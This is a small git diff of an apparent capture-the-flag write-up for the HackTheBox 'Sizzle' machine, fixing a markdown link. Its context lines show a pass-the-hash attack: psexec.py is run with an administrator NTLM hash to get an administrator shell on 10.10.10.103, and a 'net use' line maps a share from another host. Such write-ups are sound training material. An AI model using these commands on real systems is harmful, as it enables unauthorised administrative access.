@@ -159,6 +159,6 @@ net use x: \\10.10.14.19\enox /user:enox enox
 
 ⇒ We have got now the administrator NTLM hash which we can use with psexec.py to get a shell on the system as administrator
 
-`psexec.py -hashes a:f6b7160bfc91823792e0ac3a162c9267 [administrator@10.10.10.103](mailto:administrator@10.10.10.103)`
+`psexec.py -hashes a:f6b7160bfc91823792e0ac3a162c9267 administrator@10.10.10.103`
 
 ![https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Sizzle%20Box%20820989b0557d46f4bd5054fb500ba254/Untitled%2021.png](https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Sizzle%20Box%20820989b0557d46f4bd5054fb500ba254/Untitled%2021.png)
